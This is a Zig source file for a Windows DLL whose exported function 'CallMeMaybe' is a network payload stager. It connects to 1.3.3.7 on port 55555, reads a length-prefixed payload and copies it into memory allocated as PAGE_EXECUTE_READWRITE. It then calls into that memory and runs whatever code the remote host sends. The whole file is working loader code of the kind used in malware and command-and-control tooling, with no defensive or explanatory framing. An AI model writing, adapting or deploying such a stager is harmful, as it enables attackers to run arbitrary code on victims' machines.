// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const win32 = @import("win32").everything;
const win32_security = @import("win32").security;
const std = @import("std");

const windows = std.os.windows;

pub export fn CallMeMaybe() void {
    @setRuntimeSafety(false);

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    var dllSize: usize = 0;

    const stream = std.net.tcpConnectToHost(allocator, "1.3.3.7", 55555) catch return;
    defer stream.close();

    var buffer: [8]u8 = std.mem.zeroes([8]u8);

    var read = stream.readAtLeast(&buffer, @sizeOf(u32)) catch return;

    if (@sizeOf(u32) != read) {
        std.log.err("[-] Failed to readAtLeast DLL", .{});
        return;
    }

    dllSize = std.mem.readInt(u32, buffer[0..@sizeOf(u32)], std.builtin.Endian.big);

    std.log.debug("Read size : {d}", .{dllSize});

    const pHandle: ?win32.HANDLE = win32.GetCurrentProcess();

    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    const mem = win32.VirtualAllocEx(
        pHandle, //   [in]           HANDLE hProcess,
        null, //     [in, optional] LPVOID lpAddress,
        dllSize, //     [in]           SIZE_T dwSize,
        .{
            .COMMIT = 1,
            .RESERVE = 1,
        }, //                                          [in]           DWORD  flAllocationType,
        win32.PAGE_EXECUTE_READWRITE, //    [in]           DWORD  flProtect
    );

    if (mem == null) {
        std.log.err("[-] Failed to VirtualAllocEx DLL", .{});
        return;
    }
    const mem_slice = @as([*]u8, @ptrCast(mem.?))[0..dllSize];
    read = stream.readAll(mem_slice) catch return;

    if (dllSize != read) {
        std.log.err("[-] Failed to read DLL", .{});
        return;
    }

    const intFuncPtr: usize = @intFromPtr(mem.?);
    const funcPtr1: *const fn () void = @as(*const fn () void, @ptrFromInt(intFuncPtr));
    funcPtr1();
}

pub export fn DllMain(hinstDLL: win32.HINSTANCE, fdwReason: u32, lpReserved: windows.LPVOID) win32.BOOL {
    _ = lpReserved;
    _ = hinstDLL;
    _ = fdwReason;

    return windows.TRUE;
}
